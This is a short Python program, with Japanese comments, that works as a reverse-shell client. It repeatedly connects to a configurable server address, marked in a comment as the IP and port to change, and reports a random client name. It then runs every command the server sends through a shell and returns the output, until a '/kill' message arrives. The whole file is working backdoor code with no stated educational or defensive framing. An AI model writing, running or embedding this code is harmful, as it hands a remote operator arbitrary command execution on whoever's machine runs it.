import random
import socket
import subprocess
from subprocess import Popen
import sys
import time


def main(argc, argv):
    while True:
        # クライアント名 生成
        cname = "c{0:04d}".format(random.randrange(1000, 9999))
        print("Waiting: {0}".format(cname))

        # サーバ接続ループ
        while True:
            try:
                csock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                csock.connect(("127.0.0.1", 25555))  # IPアドレス・ポートを変更する
                break
            except ConnectionRefusedError:  # 接続失敗
                pass
            csock.close()
            time.sleep(3)

        # クライアント名 送信
        try:
            csock.send(cname.encode())
        except BrokenPipeError:  # サーバの強制終了
            csock.close()
            continue
        print("Start: {0}".format(cname))

        # サーバからの命令待機
        while True:
            try:
                recvmsg = csock.recv(4096).decode().strip()
            except ConnectionResetError:  # サーバ側からの切断
                csock.close()
                break

            if(len(recvmsg) <= 0):
                csock.close()
                break
            if(recvmsg == "/kill"):  # サーバからの /kill コマンド
                csock.close()
                print("Finish: {0}".format(cname))
                print("Terminated.")
                return

            response = subprocess.Popen(
                recvmsg,
                stdout=subprocess.PIPE,
                shell=True
            ).communicate()[0]

            csock.send(response)

        # 終了
        print("Finish: {0}".format(cname))

if(__name__ == "__main__"):
    main(len(sys.argv), sys.argv)
    sys.exit()
